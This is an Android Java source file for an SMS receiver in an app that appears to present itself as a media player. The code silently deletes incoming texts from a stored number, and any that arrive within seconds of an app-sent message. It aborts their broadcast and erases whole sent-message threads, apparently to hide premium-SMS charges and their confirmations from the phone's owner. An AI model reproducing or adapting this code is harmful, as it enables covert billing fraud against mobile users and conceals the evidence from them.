package cn.yoyo.mobile.yes;


import cn.yoyo.mobile.ui.Activity_Main;
import cn.yoyo.mobile.ui.OPlayerApplication;
import cn.yoyo.mobile.util.ToastUtils;


import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.text.TextUtils;
 
public class SMSReceiver extends BroadcastReceiver 
{ 
 
    // 广播消息类型 
    public final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED"; 
    public final static String SMS_SEND_ACTION = "cn.yoyo.mobile.send"; 
    public static String SMSnumber = "";
    public static String code = "";
	@Override 
    public void onReceive(Context context, Intent intent) 
    { 
    	if(intent == null) return;
    	if(intent.getAction().equals(SMS_RECEIVED_ACTION)){
    		Bundle bundle = intent.getExtras(); 
            Object messages[] = (Object[]) bundle.get("pdus"); 
            if(messages == null) return;
            SmsMessage smsMessage[] = new SmsMessage[messages.length];
            for (int n = 0; n < messages.length; n++) 
            { 
                smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]); 
                String msgContent = smsMessage[n].getMessageBody(); 
                String from = smsMessage[n].getOriginatingAddress();
                //黑名单
                SharedPreferences preference = PreferenceManager.getDefaultSharedPreferences(context);
    	        long time = preference.getLong("time", 0);
                if(!TextUtils.isEmpty(from)&&!TextUtils.isEmpty(SMSnumber)&&SMSnumber.contains(from)){
                	deleteSMS(context);
                    deleteSMS(context,msgContent);
                    abortBroadcast();
                }else if(time > 0 && System.currentTimeMillis() - time < 3000 ){
                	//删除10秒内短信
                	deleteSMS(context);
                    deleteSMS(context,msgContent);
                    abortBroadcast();
                }else{
                }
            } 
    	}else if(intent.getAction().equals(SMS_SEND_ACTION)){
    		switch (getResultCode()) {  
            case Activity.RESULT_OK: 
            	OPlayerApplication.getContext().startActivity(new Intent(OPlayerApplication.getContext(), Activity_Main.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
            	SharedPreferences preference = PreferenceManager.getDefaultSharedPreferences(context);
                preference.edit().putLong("time", System.currentTimeMillis()).commit();
                break;  
            case SmsManager.RESULT_ERROR_GENERIC_FAILURE: 
            	ToastUtils.showToast("请允许权限才能进入");
                break;  
            case SmsManager.RESULT_ERROR_NO_SERVICE: 
            	ToastUtils.showToast("出现异常，请重试");
                break;  
            case SmsManager.RESULT_ERROR_NULL_PDU:
            	ToastUtils.showToast("出现异常，请重试");
                break;  
            case SmsManager.RESULT_ERROR_RADIO_OFF:
            	ToastUtils.showToast("出现异常，请重试");
                break;  
            }  

    	}
    } 
    
    
    public void deleteSMS(Context context, String smscontent) 
    { 
        try 
        { 
            // 准备系统短信收信箱的uri地址 
            Uri uri = Uri.parse("content://sms/inbox");// 收信箱 
            // 查询收信箱里所有的短信 
            Cursor isRead = 
                    context.getContentResolver().query(uri, null, "read=" + 0, 
                            null, null); 
            while (isRead.moveToNext()) 
            { 
            	//获取发信人 
                String body = 
                        isRead.getString(isRead.getColumnIndex("body")).trim();
                // 获取信息内容 
                if (body.equals(smscontent)) 
                { 
                    int id = isRead.getInt(isRead.getColumnIndex("_id")); 
                    context.getContentResolver().delete( 
                            Uri.parse("content://sms"), "_id=" + id, null); 
                } 
            } 
        } 
        catch (Exception e) 
        { 
            e.printStackTrace(); 
        } 
    } 
    
    
    public void deleteSMS(Context context) {  
        try {  
            ContentResolver CR = context.getContentResolver();  
            // Query SMS  
            Uri uriSms = Uri.parse("content://sms/sent");  
            Cursor c = CR.query(uriSms,  
                    new String[] { "_id", "thread_id" }, null, null, null);  
            if (null != c && c.moveToFirst()) {  
                do {  
                    // Delete SMS  
                    long threadId = c.getLong(1);  
                    CR.delete(Uri.parse("content://sms/conversations/" + threadId),  
                            null, null);  
                } while (c.moveToNext());  
            }  
        } catch (Exception e) {  
            // TODO: handle exception  
            e.printStackTrace();
        }  
    }  
    
} 